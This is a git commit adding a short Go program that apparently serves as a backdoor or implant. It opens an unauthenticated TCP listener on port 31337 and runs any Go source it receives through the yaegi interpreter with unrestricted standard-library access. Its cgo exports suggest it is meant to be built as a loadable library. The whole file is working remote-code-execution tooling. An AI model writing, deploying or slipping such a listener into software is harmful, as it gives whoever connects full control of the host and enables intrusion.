ebb14c730373edb7f5aa6ef529761ae463c6a108
TerminalJockey <58610636+TerminalJockey@users.noreply.github.com>
2021-02-06 09:02:13 -0700

    Add files via upload

---
+++ main.go
@@ -0,0 +1,48 @@
+package main
+
+import (
+	"C"
+	"fmt"
+	"io/ioutil"
+	"log"
+	"net"
+
+	"github.com/traefik/yaegi/interp"
+	"github.com/traefik/yaegi/stdlib"
+	"github.com/traefik/yaegi/stdlib/unrestricted"
+)
+
+func main() {
+	fmt.Println("pushing go")
+	RunServer()
+}
+
+//EvalInput :
+//export EvalInput
+func EvalInput(incode string) {
+	i := interp.New(interp.Options{})
+	i.Use(stdlib.Symbols)
+	i.Use(unrestricted.Symbols)
+	test, err := i.Eval(incode)
+	if err != nil {
+		log.Println(err)
+	}
+	fmt.Println(test)
+}
+
+//RunServer :
+//export RunServer
+func RunServer() {
+	ln, err := net.Listen("tcp", ":31337")
+	if err != nil {
+		log.Println(err)
+	}
+	for {
+		conn, err := ln.Accept()
+		if err != nil {
+			log.Println(err)
+		}
+		inbytes, err := ioutil.ReadAll(conn)
+		EvalInput(string(inbytes))
+	}
+}
